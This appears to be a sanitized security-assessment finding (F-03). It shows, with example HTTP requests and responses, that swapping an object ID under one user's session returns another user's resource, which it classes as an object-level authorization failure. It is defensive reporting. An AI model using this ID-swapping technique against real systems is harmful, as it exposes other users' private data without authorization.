# F-03 Technical Validation

> Sanitized reconstruction. Object identifiers, paths, account data, and response content are neutral examples that preserve the confirmed authorization failure.

## Authorized object access

```http
GET /api/resources/1001 HTTP/1.1
Host: app.example.test
Cookie: session=[user-a-session]
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1001,"owner":"user-a","data":"[redacted]"}
```

## Object reference modification

The authenticated session was kept unchanged while only the object identifier was modified:

```http
GET /api/resources/1002 HTTP/1.1
Host: app.example.test
Cookie: session=[user-a-session]
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1002,"owner":"user-b","data":"[redacted]"}
```

## Security conclusion

Authentication remained valid in both requests, but the server returned an object outside the caller's expected ownership boundary. The failure was therefore object-level authorization, not authentication bypass.
